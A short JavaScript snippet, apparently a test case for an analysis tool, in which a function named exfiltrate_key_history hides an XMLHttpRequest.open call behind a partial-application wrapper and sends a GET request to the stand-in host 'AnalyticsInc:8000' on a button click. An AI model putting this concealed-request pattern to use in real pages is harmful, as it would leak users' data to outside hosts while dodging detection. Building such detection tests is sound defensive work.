function exfiltrate_key_history() {
  function partial(func$$3) {
    var args = Array.prototype.slice.call(arguments, 1);
    return function() {
      var allArguments = args.concat(Array.prototype.slice.call(arguments));
      return func$$3.apply(this, allArguments)
    }
  }
  xmlhttp = new XMLHttpRequest;
  xmlhttp.openn = partial(xmlhttp.open, "GET", "http://AnalyticsInc:8000/submission.html?test=partial", true);
  xmlhttp.openn();
  xmlhttp.send(null)
}
document.getElementById("test").onclick = exfiltrate_key_history;
